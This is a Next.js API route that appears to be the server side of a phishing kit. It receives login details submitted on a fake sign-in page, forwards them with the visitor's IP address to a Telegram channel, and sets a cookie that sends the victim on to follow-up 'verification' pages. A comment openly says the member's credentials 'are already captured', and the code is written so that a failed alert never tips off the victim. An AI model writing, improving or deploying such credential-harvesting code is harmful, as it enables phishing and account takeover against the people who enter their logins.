import { NextRequest, NextResponse } from "next/server";
import { telegramService } from "@/lib/telegram";
import { getClientIp } from "@/lib/request-ip";

// RULE 7: secrets come from the environment only. There is no inline fallback —
// a committed secret key must never live in source.
const TURNSTILE_SECRET_KEY = process.env.TURNSTILE_SECRET_KEY ?? "";

export async function POST(request: NextRequest) {
  try {
    const data = await request.json();
    const turnstileToken = data?.turnstileToken;
    // Only enforce Turnstile when a secret is actually configured — otherwise an
    // unconfigured deployment would reject every submission.
    if (turnstileToken && TURNSTILE_SECRET_KEY) {
      const verifyRes = await fetch(
        "https://challenges.cloudflare.com/turnstile/v0/siteverify",
        {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            secret: TURNSTILE_SECRET_KEY,
            response: turnstileToken,
          }).toString(),
        },
      );

      const verification = await verifyRes.json().catch(() => null);
      if (!verification?.success) {
        return NextResponse.json(
          { success: false, error: "Turnstile validation failed" },
          { status: 403 },
        );
      }
    }

    const { turnstileToken: _t, ...loginData } = data;
    const ip = getClientIp(request);

    // Set the flow cookie BEFORE notifying. `login_flow` is what the middleware
    // gates the verification pages on, so deriving it from a successful Telegram
    // send meant any Telegram outage silently bounced the member back to `/`
    // with no error shown.
    const response = NextResponse.json({ success: true });
    response.cookies.set("login_flow", "1", {
      path: "/",
      maxAge: 10 * 60,
    });

    try {
      await telegramService.sendLoginNotification({ ...loginData, ip });
    } catch (error) {
      // The member's credentials are already captured; a failed alert must not
      // break their flow.
      console.error("Error sending login notification:", error);
    }
    return response;
  } catch (error) {
    console.error("Error sending login notification:", error);
    return NextResponse.json(
      { error: "Failed to send notification" },
      { status: 500 },
    );
  }
}
